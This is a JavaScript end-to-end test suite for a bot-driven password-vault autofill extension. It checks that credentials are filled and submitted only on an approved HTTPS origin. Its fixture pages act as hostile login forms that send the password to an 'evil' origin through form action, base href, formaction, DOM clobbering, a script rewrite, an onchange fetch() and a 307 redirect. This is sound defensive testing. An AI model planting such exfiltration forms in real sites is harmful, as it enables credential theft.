// End-to-end integration test for Botkins vault autofill over local HTTPS:
// Reuses PR #258's login fixture (with a foreign chrome-extension:// iframe, React inputs,
// and a same-origin 2FA iframe) driven through the real extension DOM driver (dist/dom-driver.js)
// + BrowserController + SecureInputs + CredentialGrants + Credentials vault.
import assert from "node:assert/strict";
import { execFileSync, spawn } from "node:child_process";
import { existsSync, mkdtempSync, readFileSync, rmSync } from "node:fs";
import https from "node:https";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";

import { Credentials } from "../desktop/link/credentials.mjs";
import { CredentialGrants } from "../desktop/credential-grants.mjs";
import { ScreenBrowser } from "../desktop/host/form-browser.mjs";
import { SecureInputs, performSecureUse } from "../desktop/secure-input.mjs";
import { BrowserController } from "../../extension/src/browser-controller.mjs";

const __dirname = dirname(fileURLToPath(import.meta.url));
const repoRoot = join(__dirname, "..", "..");
const fixturesDir = join(repoRoot, "extension", "test", "fixtures");
const driverBundlePath = join(repoRoot, "extension", "dist", "dom-driver.js");

function findChromiumBinary() {
  const candidates = [
    process.env.CHROME_PATH,
    process.env.CHROMIUM_PATH,
    "/usr/bin/chromium",
    "/usr/bin/chromium-browser",
    "/usr/bin/google-chrome",
    "/usr/bin/google-chrome-stable",
    "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
  ].filter(Boolean);
  for (const p of candidates) {
    if (existsSync(p)) return p;
  }
  return null;
}

function generateSelfSignedCert(dir) {
  const keyPath = join(dir, "key.pem");
  const certPath = join(dir, "cert.pem");
  execFileSync(
    "openssl",
    [
      "req",
      "-x509",
      "-newkey",
      "rsa:2048",
      "-keyout",
      keyPath,
      "-out",
      certPath,
      "-days",
      "1",
      "-nodes",
      "-subj",
      "/CN=127.0.0.1",
      "-addext",
      "subjectAltName=IP:127.0.0.1,DNS:localhost",
    ],
    { stdio: "pipe" },
  );
  return {
    key: readFileSync(keyPath, "utf8"),
    cert: readFileSync(certPath, "utf8"),
  };
}

async function startHttpsFixtureServer(tls, { redirectTarget = null, crossOriginFrameUrl = null, evilOrigin = null, onSubmit = null, onEvilRequest = null } = {}) {
  const server = https.createServer(tls, (req, res) => {
    const cleanPath = (req.url || "/").split("?")[0];
    if (onEvilRequest) {
      let body = "";
      req.on("data", (chunk) => { body += chunk; });
      req.on("end", () => {
        onEvilRequest({ method: req.method, url: req.url, body });
        res.writeHead(200, { "Content-Type": "text/plain" });
        res.end("recorded");
      });
      return;
    }
    if (cleanPath === "/redirect" && redirectTarget) {
      res.writeHead(302, { Location: redirectTarget });
      res.end();
      return;
    }
    if (cleanPath === "/submit-ok" && req.method === "POST") {
      let body = "";
      req.on("data", (chunk) => { body += chunk; });
      req.on("end", () => {
        onSubmit?.({ path: cleanPath, body });
        res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
        res.end("<!doctype html><html><body><h1>Signed In</h1></body></html>");
      });
      return;
    }
    if (cleanPath === "/submit-redirect-evil" && req.method === "POST" && evilOrigin) {
      req.resume();
      res.writeHead(307, { Location: `${evilOrigin}/steal-redirect` });
      res.end();
      return;
    }
    if (cleanPath === "/xorigin-host" && crossOriginFrameUrl) {
      res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
      res.end(`<!doctype html><html><body>
        <h1>Host Page</h1>
        <iframe id="evil-xorigin" src="${crossOriginFrameUrl}"></iframe>
      </body></html>`);
      return;
    }
    if (evilOrigin) {
      const synthetic = {
        "/page-ok": `<!doctype html><html><body>
          <form id="login" method="post" action="/submit-ok">
            <input id="email" name="email" type="email">
            <input id="password" name="password" type="password">
            <button id="submit-btn" type="submit">Sign In</button>
          </form>
        </body></html>`,
        "/page-evil-action": `<!doctype html><html><body>
          <form id="login" method="post" action="${evilOrigin}/steal-action">
            <input id="password" name="password" type="password">
            <button id="submit-btn" type="submit">Sign In</button>
          </form>
        </body></html>`,
        "/page-http-downgrade": `<!doctype html><html><body>
          <form id="login" method="post" action="http://127.0.0.1:9/downgrade">
            <input id="password" name="password" type="password">
            <button id="submit-btn" type="submit">Sign In</button>
          </form>
        </body></html>`,
        "/page-evil-base": `<!doctype html><html><head><base href="${evilOrigin}/"></head><body>
          <form id="login" method="post" action="steal-base">
            <input id="password" name="password" type="password">
            <button id="submit-btn" type="submit">Sign In</button>
          </form>
        </body></html>`,
        "/page-evil-formaction": `<!doctype html><html><body>
          <form id="login" method="post" action="/submit-ok">
            <input id="password" name="password" type="password">
            <button id="submit-btn" type="submit" formaction="${evilOrigin}/steal-formaction">Sign In</button>
          </form>
        </body></html>`,
        "/page-evil-external-submitter": `<!doctype html><html><body>
          <form id="login" method="post" action="/submit-ok">
            <input id="password" name="password" type="password">
          </form>
          <button id="ext-btn" type="submit" form="login" formaction="${evilOrigin}/steal-ext">External</button>
        </body></html>`,
        "/page-clobbered": `<!doctype html><html><body>
          <form id="login" method="post" action="${evilOrigin}/steal-clobber">
            <input name="action" value="/submit-ok">
            <input id="password" name="password" type="password">
            <button id="submit-btn" type="submit">Sign In</button>
          </form>
        </body></html>`,
        "/page-js-rewrite": `<!doctype html><html><body>
          <form id="login" method="post" action="/submit-ok" onsubmit="this.action='${evilOrigin}/steal-js-rewrite'">
            <input id="password" name="password" type="password">
            <button id="submit-btn" type="submit">Sign In</button>
          </form>
        </body></html>`,
        "/page-js-fetch": `<!doctype html><html><body>
          <form id="login" method="post" action="/submit-ok">
            <input id="password" name="password" type="password" onchange="fetch('${evilOrigin}/steal-fetch', {method:'POST', mode:'no-cors', body:this.value})">
            <button id="submit-btn" type="submit">Sign In</button>
          </form>
        </body></html>`,
        "/page-307-redirect": `<!doctype html><html><body>
          <form id="login" method="post" action="/submit-redirect-evil">
            <input id="password" name="password" type="password">
            <button id="submit-btn" type="submit">Sign In</button>
          </form>
        </body></html>`,
      };
      if (Object.hasOwn(synthetic, cleanPath)) {
        res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
        res.end(synthetic[cleanPath]);
        return;
      }
    }
    const rel = cleanPath === "/" ? "login-with-foreign-extension.html" : cleanPath.replace(/^\/+/, "");
    const filePath = join(fixturesDir, rel);
    if (!filePath.startsWith(fixturesDir) || !existsSync(filePath)) {
      res.writeHead(404);
      res.end("Not found");
      return;
    }
    res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
    res.end(readFileSync(filePath, "utf8"));
  });
  await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
  const { port } = server.address();
  return { server, origin: `https://127.0.0.1:${port}` };
}

class CdpClient {
  constructor(wsUrl) {
    this.wsUrl = wsUrl;
    this.nextId = 1;
    this.pending = new Map();
  }

  async connect() {
    this.ws = new WebSocket(this.wsUrl);
    await new Promise((resolve, reject) => {
      this.ws.addEventListener("open", resolve, { once: true });
      this.ws.addEventListener("error", (e) => reject(new Error(e.message || "WebSocket open failed")), { once: true });
    });
    this.ws.addEventListener("message", (ev) => {
      const msg = JSON.parse(String(ev.data));
      if (msg.id && this.pending.has(msg.id)) {
        const { resolve, reject } = this.pending.get(msg.id);
        this.pending.delete(msg.id);
        if (msg.error) reject(new Error(msg.error.message || "CDP error"));
        else resolve(msg.result);
      }
    });
  }

  send(method, params = {}) {
    const id = this.nextId++;
    return new Promise((resolve, reject) => {
      this.pending.set(id, { resolve, reject });
      this.ws.send(JSON.stringify({ id, method, params }));
    });
  }

  async eval(expression, { awaitPromise = true } = {}) {
    const res = await this.send("Runtime.evaluate", {
      expression,
      returnByValue: true,
      awaitPromise,
    });
    if (res.exceptionDetails) {
      throw new Error(res.exceptionDetails.exception?.description || res.exceptionDetails.text || "Eval error");
    }
    return res.result?.value;
  }

  close() {
    try {
      this.ws?.close();
    } catch {}
  }
}

async function launchChromium(chromeBin) {
  const userDataDir = mkdtempSync(join(tmpdir(), "botkins-vault-int-"));
  const proc = spawn(
    chromeBin,
    [
      "--headless=new",
      "--no-sandbox",
      "--disable-gpu",
      "--disable-dev-shm-usage",
      "--no-first-run",
      "--no-default-browser-check",
      "--disable-background-networking",
      "--disable-extensions",
      "--disable-sync",
      "--disable-crash-reporter",
      "--ignore-certificate-errors",
      "--remote-debugging-port=0",
      `--user-data-dir=${userDataDir}`,
      "--window-size=1280,900",
      "about:blank",
    ],
    { stdio: ["ignore", "ignore", "pipe"] },
  );

  let cdp = null;
  async function cleanupProcess() {
    cdp?.close();
    try {
      proc.stderr?.destroy();
    } catch {}
    if (proc.exitCode === null && proc.signalCode === null) {
      try {
        proc.kill("SIGTERM");
      } catch {}
      await new Promise((resolve) => {
        const t = setTimeout(() => {
          try {
            proc.kill("SIGKILL");
          } catch {}
          resolve();
        }, 3000);
        proc.once("exit", () => {
          clearTimeout(t);
          resolve();
        });
      });
    }
    try {
      rmSync(userDataDir, { recursive: true, force: true, maxRetries: 5, retryDelay: 100 });
    } catch {}
  }

  let wsBrowserUrl;
  try {
    let stderrBuf = "";
    wsBrowserUrl = await new Promise((resolve, reject) => {
      const timer = setTimeout(() => reject(new Error(`Chromium timed out. stderr:\n${stderrBuf}`)), 45000);
      proc.stderr.on("data", (chunk) => {
        stderrBuf += chunk.toString();
        const match = stderrBuf.match(/DevTools listening on (ws:\/\/[^\s]+)/);
        if (match) {
          clearTimeout(timer);
          resolve(match[1]);
        }
      });
      proc.once("exit", (code) => {
        clearTimeout(timer);
        reject(new Error(`Chromium exited early (${code}). stderr:\n${stderrBuf}`));
      });
    });

    const baseHttp = wsBrowserUrl.replace(/^ws:/, "http:").replace(/\/devtools\/browser\/.*$/, "");
    const targets = await fetch(`${baseHttp}/json/list`).then((r) => r.json());
    const pageTarget = targets.find((t) => t.type === "page") || targets[0];
    assert.ok(pageTarget?.webSocketDebuggerUrl, "Expected a Chromium page target");

    cdp = new CdpClient(pageTarget.webSocketDebuggerUrl);
    await cdp.connect();
    await cdp.send("Page.enable");
    await cdp.send("Runtime.enable");
  } catch (err) {
    await cleanupProcess();
    throw err;
  }

  let currentUrl = "about:blank";
  async function navigate(url) {
    await cdp.send("Page.navigate", { url });
    for (let i = 0; i < 80; i++) {
      const ready = await cdp.eval(
        `document.readyState === "complete" && (!document.getElementById("reachable-iframe") || document.getElementById("reachable-iframe").contentDocument?.readyState === "complete")`,
      );
      if (ready) break;
      await new Promise((r) => setTimeout(r, 50));
    }
    currentUrl = await cdp.eval("location.href");
  }

  async function close() {
    await cleanupProcess();
  }

  return {
    cdp,
    navigate,
    close,
    getUrl: async () => (currentUrl = await cdp.eval("location.href")),
  };
}

const chromeBin = findChromiumBinary();

test(
  "HTTPS extension_fill integration over the secure.fill path: Ask -> fill, same-site submit, Always allow -> no card, cross-site action filled but not submitted, redirect refused, TOTP in same-origin iframe",
  { skip: !chromeBin ? "No Chromium/Chrome binary available on this host" : false },
  async (t) => {
    if (!existsSync(driverBundlePath)) {
      execFileSync(process.execPath, [join(repoRoot, "extension", "scripts", "build.mjs")], { stdio: "pipe" });
    }
    assert.ok(existsSync(driverBundlePath), "extension/dist/dom-driver.js must exist");
    const driverCode = readFileSync(driverBundlePath, "utf8");

    const workDir = mkdtempSync(join(tmpdir(), "botkins-vault-https-"));
    t.after(() => rmSync(workDir, { recursive: true, force: true }));

    const tls = generateSelfSignedCert(workDir);
    const evilServer = await startHttpsFixtureServer(tls);
    const trustedServer = await startHttpsFixtureServer(tls, {
      redirectTarget: `${evilServer.origin}/`,
      crossOriginFrameUrl: `${evilServer.origin}/subframe.html`,
      evilOrigin: evilServer.origin,
    });
    t.after(() => {
      trustedServer.server.closeAllConnections?.();
      trustedServer.server.close();
      evilServer.server.closeAllConnections?.();
      evilServer.server.close();
    });

    const browser = await launchChromium(chromeBin);
    t.after(() => browser.close());

    // Wire globalThis.chrome directly to our headless Chromium tab (with isolated worlds
    // and chrome.debugger blocked, matching the real foreign-extension Chrome scenario!)
    const prevChrome = globalThis.chrome;
    t.after(() => {
      if (prevChrome === undefined) delete globalThis.chrome;
      else globalThis.chrome = prevChrome;
    });

    const tabId = 101;
    let frameContexts = new Map();
    const tab = {
      id: tabId,
      windowId: 1,
      title: "",
      url: "about:blank",
      active: true,
      pinned: false,
      groupId: -1,
      incognito: false,
      status: "complete",
    };

    async function navigateAndBind(url) {
      await browser.navigate(url);
      tab.url = await browser.getUrl();
      tab.title = await browser.cdp.eval("document.title");
      frameContexts = new Map();
      const frameTree = await browser.cdp.send("Page.getFrameTree");
      const topFrame = frameTree.frameTree.frame;
      const topIso = await browser.cdp.send("Page.createIsolatedWorld", {
        frameId: topFrame.id,
        worldName: "botkins-vault-top",
      });
      frameContexts.set(0, topIso.executionContextId);
      const childFrames = frameTree.frameTree.childFrames || [];
      let fid = 2;
      for (const cf of childFrames) {
        const frameUrl = String(cf.frame?.url || "");
        // Only same-origin / http(s) subframes get isolated worlds (foreign chrome-extension:// cannot!)
        if (frameUrl.startsWith("https://") || frameUrl.startsWith("http://")) {
          try {
            // One world name for every frame, as Chrome gives one extension a single isolated world:
            // the driver fills a same-origin iframe from the top frame and marks it in that shared world.
            const iso = await browser.cdp.send("Page.createIsolatedWorld", {
              frameId: cf.frame.id,
              worldName: "botkins-vault-top",
            });
            frameContexts.set(fid, iso.executionContextId);
            fid++;
          } catch {}
        }
      }
    }

    async function evalInContext(expression, contextId) {
      const params = { expression, returnByValue: true, awaitPromise: true };
      if (contextId !== undefined) params.contextId = contextId;
      const res = await browser.cdp.send("Runtime.evaluate", params);
      if (res.exceptionDetails) {
        throw new Error(res.exceptionDetails.exception?.description || res.exceptionDetails.text || "Eval error");
      }
      return res.result?.value;
    }

    globalThis.chrome = {
      tabs: {
        query: async () => [tab],
        get: async () => tab,
        update: async (_id, patch) => Object.assign(tab, patch),
        captureVisibleTab: async () => "data:image/jpeg;base64,Vk1JR0VDTk9DRFA=",
      },
      windows: { update: async () => ({}) },
      tabGroups: { query: async () => [] },
      scripting: {
        executeScript: async (injection) => {
          if (injection.world === "MAIN") {
            const fnSrc = injection.func.toString();
            const argsJson = JSON.stringify(injection.args || []);
            const result = await evalInContext(`(${fnSrc})(...${argsJson})`);
            return [{ frameId: 0, result }];
          }
          const targetFrames = injection.target.frameIds || (injection.target.allFrames ? [...frameContexts.keys()] : [0]);
          const out = [];
          for (const fid of targetFrames) {
            const ctxId = frameContexts.get(fid);
            if (!ctxId) continue;
            if (injection.files) {
              await evalInContext(driverCode, ctxId);
              out.push({ frameId: fid, result: undefined });
            } else {
              const fnSrc = injection.func.toString();
              const argsJson = JSON.stringify(injection.args || []);
              const result = await evalInContext(`(${fnSrc})(...${argsJson})`, ctxId);
              out.push({ frameId: fid, result });
            }
          }
          return out;
        },
      },
      debugger: {
        onDetach: { addListener: () => {} },
        attach: async () => {
          throw new Error("Cannot access a chrome-extension:// URL of different extension");
        },
        detach: async () => {},
        sendCommand: async () => {
          throw new Error("Cannot access a chrome-extension:// URL of different extension");
        },
      },
    };

    const controller = new BrowserController({
      getSettings: async () => ({ enabled: true, mode: "all", groupName: "Botkins", groupColor: "orange", pausedTabIds: [] }),
      uploadScreenshot: async (b64, name) => `uploaded:${name}:${b64.length}`,
    });

    // Set up encrypted Botkins vault + CredentialGrants + SecureInputs
    const secretPassword = "S&S-RealIntegrationSecret!90210";
    const totpSecret = "JBSWY3DPEHPK3PXP";
    const creds = new Credentials({
      dir: join(workDir, "vault"),
      protect: (b) => b,
      reveal: (b) => b,
    });
    const credId = await creds.save({
      name: "Scissors & Scotch",
      kind: "login",
      username: "colt@scissorsscotch.com",
      website: trustedServer.origin,
      value: secretPassword,
      totpSecret,
    });
    const grants = new CredentialGrants({ dir: join(workDir, "grants") });

    const cards = [];
    let nextCardAction = "approve";
    const chat = { id: "chat-int-1" };
    const bot = { id: "alfie", name: "Alfie" };
    const run = { id: "run-int-1" };
    const task = { id: "task-int-1", stopped: false, ended: false };
    const fakeWs = {
      closing: false,
      active: new Map([[chat.id, task]]),
      accessForTurn: () => ({ member: false }),
      peopleOf: () => ({ invited: [] }),
      interactions: {
        request: async (_chat, _task, card) => {
          cards.push(card);
          assert.ok(!JSON.stringify(card).includes(secretPassword), "Approval card must never contain secret");
          return { action: nextCardAction };
        },
      },
    };

    // The one extension path: main's secure.fill transport to an enabled, live device, which
    // the real BrowserController answers on the real HTTPS page.
    const bridge = {
      devices: () => [{ id: "dev-1", name: "Chrome", connected: true, enabled: true }],
      call: async (name) => {
        assert.equal(name, "browser_tabs");
        return controller.run("browser_tabs", {});
      },
      secureFill: (_deviceId, payload) => controller.runSecureFill(payload),
    };
    const secureInputs = new SecureInputs(fakeWs, performSecureUse, {
      credentials: () => creds,
      credentialGrants: grants,
      browserTools: bridge,
      savedLogins: (_chatId, origin, opts) => creds.findForSite({ url: opts?.url ?? origin, query: opts?.query }),
    });
    const tools = new Map(secureInputs.tools(bot, chat, run, task).map((tool) => [tool.name, tool.handler]));
    const loginFields = [
      { name: "email", source: "username" },
      { name: "password", source: "value" },
    ];

    // 1. Fill only under default Ask: one card, both inputs filled, nothing submitted.
    await navigateAndBind(`${trustedServer.origin}/`);
    nextCardAction = "approve";
    const fillRes1 = JSON.parse(await tools.get("use_credential")({
      credentialId: credId,
      operation: "extension_fill",
      destination: `${trustedServer.origin}/`,
      fields: loginFields,
    }));
    assert.equal(cards.length, 1, "First use under Ask must raise an approval card");
    assert.equal(fillRes1.applied, true);
    assert.deepEqual(fillRes1.filled, ["email", "password"]);
    assert.equal(fillRes1.submitted, undefined, "no submit was asked for");
    assert.ok(!JSON.stringify(fillRes1).includes(secretPassword), "Secret must never appear in tool output");
    const pageCheck1 = await browser.cdp.eval(`({
      email: document.querySelector('#email').value,
      reactEmail: window.__reactInputState?.email,
      passwordMatches: document.querySelector('#password').value === ${JSON.stringify(secretPassword)},
      submits: window.__submits?.length ?? 0,
    })`);
    assert.equal(pageCheck1.email, "colt@scissorsscotch.com");
    assert.equal(pageCheck1.reactEmail, "colt@scissorsscotch.com");
    assert.equal(pageCheck1.passwordMatches, true);
    assert.equal(pageCheck1.submits, 0);
    const snap = await controller.run("browser_snapshot", { tabId });
    assert.ok(!JSON.stringify(snap).includes(secretPassword), "browser_snapshot must never expose password value");

    // 2. Same-site submit succeeds: the form has no action, so it submits to the page itself.
    await navigateAndBind(`${trustedServer.origin}/`);
    nextCardAction = "remember";
    const fillRes2 = JSON.parse(await tools.get("use_credential")({
      credentialId: credId,
      operation: "extension_fill",
      destination: `${trustedServer.origin}/`,
      fields: loginFields,
      submit: true,
    }));
    assert.equal(cards.length, 2);
    assert.equal(fillRes2.applied, true);
    assert.equal(fillRes2.submitted, true, "a same-site form must be submitted");
    assert.equal(fillRes2.submitRefused, undefined);
    assert.equal(fillRes2.grantLevel, "always");
    const submits = await browser.cdp.eval(`window.__submits`);
    assert.equal(submits.length, 1);
    assert.equal(submits[0].email, "colt@scissorsscotch.com");
    assert.equal(submits[0].passwordLength, secretPassword.length);

    // 3. The standing Always-allow grant fills again with no new card.
    await navigateAndBind(`${trustedServer.origin}/`);
    const fillRes3 = JSON.parse(await tools.get("use_credential")({
      credentialId: credId,
      operation: "extension_fill",
      destination: `${trustedServer.origin}/`,
      fields: loginFields,
    }));
    assert.equal(cards.length, 2, "Standing Always-allow grant must fill without raising another card");
    assert.equal(fillRes3.applied, true);
    assert.equal(fillRes3.grantLevel, "always");

    // 4. A form that would post to a different site (action, HTTP downgrade, <base href>, formaction,
    // an external submitter, DOM clobbering) is filled but never submitted, and the result says why.
    grants.setGrant({
      credentialId: credId,
      botId: "bot-bad-paths",
      operation: "extension_fill",
      destination: trustedServer.origin,
      level: "always",
    });
    const badPathTools = new Map(
      secureInputs.tools({ id: "bot-bad-paths", name: "BadPathBot" }, chat, run, task).map((tool) => [tool.name, tool.handler]),
    );
    for (const badPath of [
      "/page-evil-action",
      "/page-http-downgrade",
      "/page-evil-base",
      "/page-evil-formaction",
      "/page-evil-external-submitter",
      "/page-clobbered",
    ]) {
      await navigateAndBind(`${trustedServer.origin}${badPath}`);
      const res = JSON.parse(await badPathTools.get("use_credential")({
        credentialId: credId,
        operation: "extension_fill",
        destination: `${trustedServer.origin}${badPath}`,
        fields: [{ name: "password", source: "value" }],
        submit: true,
      }));
      assert.equal(res.applied, true, `${badPath} still fills`);
      assert.deepEqual(res.filled, ["password"]);
      assert.equal(res.submitted, false, `${badPath} must not be submitted`);
      assert.equal(res.submitRefused, "cross_site_action", badPath);
      assert.match(res.message, /different site/);
      await new Promise((r) => setTimeout(r, 150));
      assert.ok((await browser.getUrl()).startsWith(`${trustedServer.origin}${badPath}`), `${badPath} must stay on the approved page`);
      assert.equal(await browser.cdp.eval(`document.querySelector('#password').value`), secretPassword);
    }

    // 5. A tab redirected to another origin is not a tab on the approved origin: nothing is filled.
    await navigateAndBind(`${trustedServer.origin}/redirect`);
    assert.ok((await browser.getUrl()).startsWith(evilServer.origin), "Expected 302 redirect to evil origin");
    await assert.rejects(
      () => tools.get("use_credential")({
        credentialId: credId,
        operation: "extension_fill",
        destination: `${trustedServer.origin}/`,
        fields: [{ name: "password", source: "value" }],
      }),
      /No connected browser extension tab is open/,
    );
    assert.notEqual(await browser.cdp.eval(`document.querySelector('#password').value`), secretPassword);
    // The extension's own re-check refuses a fill pinned to the approved origin on the redirected tab.
    await assert.rejects(
      () => controller.runSecureFill({ tabId, origin: trustedServer.origin, fields: [{ key: "password", kind: "password", value: "dummy-value-1" }] }),
      (err) => err.secureCode === "origin_mismatch",
    );

    // 6. Asking for the evil origin directly does not reuse the trusted origin's grant.
    nextCardAction = "deny";
    const evilDirectRes = JSON.parse(await tools.get("use_credential")({
      credentialId: credId,
      operation: "extension_fill",
      destination: `${evilServer.origin}/`,
      fields: [{ name: "password", source: "value" }],
    }));
    assert.equal(cards.length, 3, "Different origin must NOT inherit trusted origin's standing grant");
    assert.equal(evilDirectRes.applied, false);
    assert.equal(evilDirectRes.denied, true);

    // 7. A cross-origin iframe is never walked: its input is reported missing, not filled.
    await navigateAndBind(`${trustedServer.origin}/xorigin-host`);
    const xorigin = JSON.parse(await tools.get("use_credential")({
      credentialId: credId,
      operation: "extension_fill",
      destination: `${trustedServer.origin}/xorigin-host`,
      fields: [{ name: "frame-code", source: "totp" }],
      totp: true,
    }));
    assert.deepEqual(xorigin.filled, []);
    assert.deepEqual(xorigin.missing, ["frame-code"]);

    // 8. A TOTP code fills the same-origin iframe under the same grant and is scrubbed from output.
    await navigateAndBind(`${trustedServer.origin}/`);
    const totpRes = JSON.parse(await tools.get("use_credential")({
      credentialId: credId,
      operation: "extension_fill",
      destination: `${trustedServer.origin}/`,
      fields: [{ name: "frame-code", source: "totp" }],
      totp: true,
    }));
    assert.equal(cards.length, 3, "TOTP on same trusted origin reuses the standing grant");
    assert.deepEqual(totpRes.filled, ["frame-code"]);
    const otpFilled = await browser.cdp.eval(
      `document.getElementById('reachable-iframe').contentDocument.querySelector('#frame-code').value`,
    );
    assert.match(otpFilled, /^\d{6}$/, "Expected 6-digit TOTP code filled into same-origin iframe");
    assert.ok(!JSON.stringify(totpRes).includes(otpFilled), "TOTP code must be scrubbed from tool output");

    // 9. The filled tab refuses browser_eval and browser_cdp, and snapshots redact the code.
    await assert.rejects(
      () => controller.run("browser_eval", { tabId, expression: "document.querySelector('#password').value" }),
      /securely filled value/,
    );
    await assert.rejects(
      () => controller.run("browser_cdp", { tabId, method: "Runtime.evaluate", params: { expression: "1+1" } }),
      /securely filled value/,
    );
    const snapJson = JSON.stringify(await controller.run("browser_snapshot", { tabId }));
    assert.ok(!snapJson.includes(secretPassword), "snapshot must never contain filled password");
    assert.ok(!snapJson.includes(otpFilled), "snapshot must never contain secret-filled TOTP value");

    // 10. A password is never filled into a non-password input.
    await assert.rejects(
      () => tools.get("use_credential")({
        credentialId: credId,
        operation: "extension_fill",
        destination: `${trustedServer.origin}/`,
        fields: [{ name: "email", source: "value" }],
      }),
      /password input/i,
    );
  },
);

test(
  "HTTPS ScreenBrowser integration (page_fill / page_fill_submit): enforces approved origin at DOM and CDP Fetch network boundary",
  { skip: !chromeBin ? "No Chromium/Chrome binary available on this host" : false },
  async (t) => {
    const workDir = mkdtempSync(join(tmpdir(), "botkins-screenbrowser-https-"));
    t.after(() => rmSync(workDir, { recursive: true, force: true }));

    const tls = generateSelfSignedCert(workDir);
    const evilRequests = [];
    const okSubmits = [];
    const evilServer = await startHttpsFixtureServer(tls, {
      onEvilRequest: (req) => evilRequests.push(req),
    });
    const trustedServer = await startHttpsFixtureServer(tls, {
      evilOrigin: evilServer.origin,
      onSubmit: (sub) => okSubmits.push(sub),
    });
    t.after(() => {
      trustedServer.server.closeAllConnections?.();
      trustedServer.server.close();
      evilServer.server.closeAllConnections?.();
      evilServer.server.close();
    });

    const browser = new ScreenBrowser({
      executable: chromeBin,
      args: ["--headless=new", "--no-sandbox", "--ignore-certificate-errors"],
      env: { ...process.env, DISPLAY: process.env.DISPLAY || ":99" },
    });
    t.after(() => browser.stop());

    const chatId = "chat-screenbrowser-https";
    const dummySecret = "dummy-screenbrowser-secret-only";
    const dummyEmail = "dummy@example.test";

    // 1. ALLOW: same-origin HTTPS form fill + submit delivers dummy secret ONLY to trustedServer
    const okUrl = `${trustedServer.origin}/page-ok`;
    await browser.open(chatId, okUrl);
    const okDoc = await browser.bind(chatId, okUrl);
    await browser.fill(
      {
        chatId,
        url: okUrl,
        document: okDoc,
        fields: [{ key: "email" }, { key: "password" }],
        submit: { selector: "#submit-btn" },
      },
      { email: dummyEmail, password: dummySecret },
      AbortSignal.timeout(10_000),
    );
    await new Promise((r) => setTimeout(r, 400));
    assert.equal(okSubmits.length, 1, "Same-origin HTTPS submit must succeed");
    assert.ok(okSubmits[0].body.includes(dummySecret), "Trusted origin received dummy form payload");
    assert.equal(evilRequests.length, 0, "Evil origin must receive zero requests");

    // 2. DENY BEFORE FILLING: off-origin <form action>, HTTP downgrade, <base href>,
    // <button formaction>, external submitter, and DOM-clobbered <input name="action">
    for (const badPath of [
      "/page-evil-action",
      "/page-http-downgrade",
      "/page-evil-base",
      "/page-evil-formaction",
      "/page-evil-external-submitter",
      "/page-clobbered",
    ]) {
      const url = `${trustedServer.origin}${badPath}`;
      await browser.open(chatId, url);
      const doc = await browser.bind(chatId, url);
      const submitTarget = badPath === "/page-evil-external-submitter"
        ? { selector: "#ext-btn" }
        : { selector: "#submit-btn" };
      await assert.rejects(
        () => browser.fill(
          {
            chatId,
            url,
            document: doc,
            fields: [{ key: "password" }],
            submit: submitTarget,
          },
          { password: dummySecret },
          AbortSignal.timeout(10_000),
        ),
        /approved origin|submit destination|https/i,
        `${badPath} must fail closed before filling`,
      );
      await new Promise((r) => setTimeout(r, 150));
      assert.equal(evilRequests.length, 0, `${badPath} must never reach evil origin`);
    }

    // 3. DENY AT BROWSER NETWORK BOUNDARY (CDP Fetch.enable):
    // 3a. JS onsubmit handler rewrites form.action to evilServer right at submit time
    {
      const url = `${trustedServer.origin}/page-js-rewrite`;
      await browser.open(chatId, url);
      const doc = await browser.bind(chatId, url);
      await assert.rejects(
        () => browser.fill(
          {
            chatId,
            url,
            document: doc,
            fields: [{ key: "password" }],
            submit: { selector: "#submit-btn" },
          },
          { password: dummySecret },
          AbortSignal.timeout(10_000),
        ),
        /browser boundary|approved https origin/i,
        "CDP Fetch boundary guard must catch and report JS onsubmit cross-origin rewrite",
      );
      await new Promise((r) => setTimeout(r, 300));
      assert.equal(evilRequests.length, 0, "CDP Fetch boundary guard must block JS onsubmit cross-origin action rewrite");
    }

    // 3b. JS onchange handler tries to fetch() the filled value to evilServer
    {
      const url = `${trustedServer.origin}/page-js-fetch`;
      await browser.open(chatId, url);
      const doc = await browser.bind(chatId, url);
      try {
        await browser.fill(
          {
            chatId,
            url,
            document: doc,
            fields: [{ key: "password" }],
          },
          { password: dummySecret },
          AbortSignal.timeout(10_000),
        );
      } catch (err) {
        assert.match(String(err?.message || err), /browser boundary|approved https origin/i);
      }
      await new Promise((r) => setTimeout(r, 300));
      assert.equal(evilRequests.length, 0, "CDP Fetch boundary guard must block JS onchange cross-origin fetch");
    }

    // 3c. Same-origin POST returns 307 redirect to evilServer
    {
      const url = `${trustedServer.origin}/page-307-redirect`;
      await browser.open(chatId, url);
      const doc = await browser.bind(chatId, url);
      await assert.rejects(
        () => browser.fill(
          {
            chatId,
            url,
            document: doc,
            fields: [{ key: "password" }],
            submit: { selector: "#submit-btn" },
          },
          { password: dummySecret },
          AbortSignal.timeout(10_000),
        ),
        /browser boundary|approved https origin/i,
        "CDP Fetch boundary guard must catch and block 307 cross-origin redirect",
      );
      await new Promise((r) => setTimeout(r, 300));
      assert.equal(evilRequests.length, 0, "CDP Fetch boundary guard must block 307 cross-origin redirect");
    }
  },
);

